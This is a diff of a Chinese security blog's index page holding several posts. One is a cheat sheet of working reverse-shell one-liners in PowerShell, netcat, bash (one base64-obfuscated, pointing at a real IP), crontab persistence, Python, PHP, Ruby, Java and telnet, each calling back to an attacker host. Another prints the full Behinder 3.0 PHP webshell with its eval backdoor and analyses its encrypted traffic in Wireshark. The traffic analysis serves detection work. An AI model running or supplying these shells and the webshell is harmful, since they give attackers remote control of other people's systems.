@@ -146,6 +146,515 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-反弹shell" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/24/反弹shell/">反弹shell</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/24/反弹shell/" class="archive-article-date">
+  	<time datetime="2020-10-24T05:14:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
+<hr>
+<h2><span id="1-powershell">1. PowerShell</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地：</span><br><span class="line">nc -lv 8888</span><br><span class="line"></span><br><span class="line">目标：</span><br><span class="line"></span><br><span class="line">powershell -w hidden -nop -c function RSC&#123;if ($c.Connected -eq $true) &#123;$c.Close()&#125;;if ($p.ExitCode -ne $null) &#123;$p.Close()&#125;;exit;&#125;;$a=&apos;10.10.10.10&apos;;$p=&apos;8888&apos;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&apos;cmd.exe&apos;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read())&#125;;$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) &#123;if ($c.Connected -ne $true) &#123;RSC&#125;;$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) &#123;$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) &#123;RSC&#125;;if ($nb[0..$($pos-1)] -contains 10) &#123;break&#125;&#125;;if ($pos -gt 0)&#123;$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null)&#123;RSC&#125;else&#123;$o=$e.GetString($os.Read());while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read());if ($o -eq $str) &#123;$o=&apos;&apos;&#125;&#125;;$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null&#125;&#125;else&#123;RSC&#125;&#125;;</span><br></pre></td></tr></table></figure>
+<h2><span id="2-netcat">2. Netcat</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">公网：nc -lv 8888</span><br><span class="line">目标：nc -e cmd.exe 10.10.10.10 8888 #nc -e /bin/sh 10.10.10.10 8888</span><br><span class="line"></span><br><span class="line">#获得交互式的shell：</span><br><span class="line">在得到shell后执行：python -c &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
+<h2><span id="3-bash">3. Bash</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1</span><br><span class="line">注：这个由解析shell的bash完成，有些时候不支持</span><br><span class="line"></span><br><span class="line">reber@wyb:~$ cat tmp.txt </span><br><span class="line">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExNC4xMTUuMTgzLjg2LzY2NjYgMD4mMQ==</span><br><span class="line">reber@wyb:~$ cat tmp.txt |base64 -d</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/114.115.183.86/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">reber@wyb:~$ &#123;cat,tmp.txt&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="4-crontab">4. crontab</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下面这条命令执行后会每隔30分钟反弹一次：</span><br><span class="line">(crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9;</span><br><span class="line">exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|</span><br><span class="line">crontab -</span><br></pre></td></tr></table></figure>
+<h2><span id="5-python">5. Python</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,</span><br><span class="line">socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); </span><br><span class="line">os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+<h2><span id="perl">Perl</span></h2><figure class="highlight perl"><figcaption><span>-e 'use Socket;$i</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="keyword">open</span>(STDIN,</span><br><span class="line"><span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);&#125;;<span class="string">'</span></span><br><span class="line"><span class="string">0x06 PHP</span></span><br><span class="line"><span class="string">php -r '</span>$sock=fsockopen(<span class="string">"10.10.10.10"</span>,<span class="number">8888</span>);<span class="keyword">exec</span>(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h2><span id="ruby">Ruby</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.10.10.10&quot;,8888).to_i;</span><br><span class="line">exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
+<h2><span id="java">Java</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.10/8888;cat &lt;&amp;5 | </span><br><span class="line">while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<h2><span id="telnet">telnet</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">两种方法：</span><br><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br><span class="line">telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br><span class="line">第一种hacker运行：nc -vlp 8080</span><br><span class="line">第二种hacker运行：nc -vlp 8080和nc -vlp 8888</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">反弹shell</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/24/反弹shell/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-从HTTP协议层面探讨Bypass-WAF" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/21/从HTTP协议层面探讨Bypass-WAF/">从HTTP协议层面探讨Bypass WAF</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/21/从HTTP协议层面探讨Bypass-WAF/" class="archive-article-date">
+  	<time datetime="2020-10-21T01:43:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/21/从HTTP协议层面探讨Bypass-WAF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-冰蝎流量解密分析" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/12/冰蝎流量解密分析/">冰蝎流量解密分析</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/12/冰蝎流量解密分析/" class="archive-article-date">
+  	<time datetime="2020-10-12T08:40:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h2><span id="shell">shell</span></h2><p>冰蝎3.0的php shell<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">    $key=<span class="string">"e45e329feb5d925b"</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	$_SESSION[<span class="string">'k'</span>]=$key;</span><br><span class="line">	$post=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">		$post=$t($post.<span class="string">""</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, <span class="string">"AES128"</span>, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">($p)</span> </span>&#123;<span class="keyword">eval</span>($p.<span class="string">""</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C(),$params);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>取消了动态的密钥协商，采用密钥预共享的方式，密钥协商的特征没了。</p>
+<h2><span id="wireshark分析流量">wireshark分析流量</span></h2><h3><span id="1">1.</span></h3><h4><span id="请求">请求</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /bingxie3.php HTTP/1.1</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Host: 192.168.150.129</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 2520</span><br><span class="line">Cookie: PHPSESSID=93vgns871ju4lvst0m1i5p3tj9</span><br><span class="line"></span><br><span class="line">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</span><br></pre></td></tr></table></figure>
+<p>AES解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert|eval(base64_decode(&apos;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSI0Tld4M1ZmaUxOZGlQT0RQWTB6UEpnNDJwQW11dWV5cFIyTHVPeGZyZUdRWHozekduRXNjNk9YWm5lTW5sQ1piVXVFTWdRQVVwWHU3VFVBbEM0b1hPcGRnR0I0dkhrVzhOV0lZOGVoN1lGWXdGN1ZWeVhMS0o4NW5TQnBSWWdFMHR4MGZzbENNRGs1bXdUWVZiVk5TS241SGpQNWZtSFVSc0FnTFpPUHM0R01ONnFxazBvdTRFbHhVbjVMNmFIYU92SGxmTU5iZEgxUnRFbUZxRmtyd0VqT1M2ZVNwS0ttWXdmcEdzVTZabVdhSW5SMTN2bFF6dVc0ejE3aWtvWHNSSTk0U0c3UVRlclhaZWNaN3dvd21qOUNna1gzMDdVTFh0UGVrZkl3dHh4U1BtdHM5YTdVWGRlMXNhcW1nWko2bmxDdjl1eXJOc2xmR1VIWTBCeTRWeG90RW5wczV0U2Jtc3dOUGlySndNZ041TjRIN0REWjNQRDh3OHVkbkdkcmFxUHR0Yzl1SVQ5VWFEa09palJveGc1SVJuNWZuYlUyZHhRY014bTFIc2kxV25FbGZnNGRvZnM0OFNnRGVRakt6ZFlOZ2tXQ0hrc0JDSnV3Z2RmRWZoYVlGOWJBd2xKQ3NjWEl5ZFFGeGZBRVRNUXlKUDlzeERDTnM4ZGxxeEdvQkNMcEpsUTRZUk5uVmxJVTFxbjhZT1VBTHZXZ3FQZ3BXMzhxTjZ6VmJpNG00Nkk2TDhja2JIWVNjU3RYajB4REJocGk5M3VOWWtMaFlNMlEzTndhMTNRV3VETEpPZFRXaFlyNmVpY1oyUHRNNkJDTEpoV0JXckNYUkdsN3N3aHhDczY3YnF5dU8xZDM0dHhCcFdNT05VeGhjTDRzOG5OT2U2U1lEU2ViSVVjcXd4ek0xUmFLVGR4UUZJMFFZOUYyeUdHRHd6N2NJdVJXVk9lRE9Jb3BFNjRGZ2ZLOUdMUFVrenNnNGkzUGdvckdSckZQT29SSjVLc3JzT3hjbmNacWU0blJNNHNKU09ZM3FEZHc3WUZKZHRyY2ZNUVRSR2NZRjdVQnZBZkNGaEI5Q2hPV2VzeW1nRTk4OU40M3NDS1FYcCI7DQptYWluKCRjb250ZW50KTs=&apos;));</span><br></pre></td></tr></table></figure></p>
+<p>base64解密eval执行内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">($content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = <span class="keyword">array</span>();</span><br><span class="line">    $result[<span class="string">"status"</span>] = base64_encode(<span class="string">"success"</span>);</span><br><span class="line">    $result[<span class="string">"msg"</span>] = base64_encode($content);</span><br><span class="line">    $key = $_SESSION[<span class="string">'k'</span>];</span><br><span class="line">    <span class="keyword">echo</span> encrypt(json_encode($result),$key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> openssl_encrypt($data, <span class="string">"AES128"</span>, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$content=<span class="string">"4NWx3VfiLNdiPODPY0zPJg42pAmuueypR2LuOxfreGQXz3zGnEsc6OXZneMnlCZbUuEMgQAUpXu7TUAlC4oXOpdgGB4vHkW8NWIY8eh7YFYwF7VVyXLKJ85nSBpRYgE0tx0fslCMDk5mwTYVbVNSKn5HjP5fmHURsAgLZOPs4GMN6qqk0ou4ElxUn5L6aHaOvHlfMNbdH1RtEmFqFkrwEjOS6eSpKKmYwfpGsU6ZmWaInR13vlQzuW4z17ikoXsRI94SG7QTerXZecZ7wowmj9CgkX307ULXtPekfIwtxxSPmts9a7UXde1saqmgZJ6nlCv9uyrNslfGUHY0By4VxotEnps5tSbmswNPirJwMgN5N4H7DDZ3PD8w8udnGdraqPttc9uIT9UaDkOijRoxg5IRn5fnbU2dxQcMxm1Hsi1WnElfg4dofs48SgDeQjKzdYNgkWCHksBCJuwgdfEfhaYF9bAwlJCscXIydQFxfAETMQyJP9sxDCNs8dlqxGoBCLpJlQ4YRNnVlIU1qn8YOUALvWgqPgpW38qN6zVbi4m46I6L8ckbHYScStXj0xDBhpi93uNYkLhYM2Q3Nwa13QWuDLJOdTWhYr6eicZ2PtM6BCLJhWBWrCXRGl7swhxCs67bqyuO1d34txBpWMONUxhcL4s8nNOe6SYDSebIUcqwxzM1RaKTdxQFI0QY9F2yGGDwz7cIuRWVOeDOIopE64FgfK9GLPUkzsg4i3PgorGRrFPOoRJ5KsrsOxcncZqe4nRM4sJSOY3qDdw7YFJdtrcfMQTRGcYF7UBvAfCFhB9ChOWesymgE989N43sCKQXp"</span>;</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure></p>
+<h4><span id="返回">返回</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 12 Oct 2020 08:31:05 GMT</span><br><span class="line">Server: Apache/2.4.46 (Debian)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1537</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span 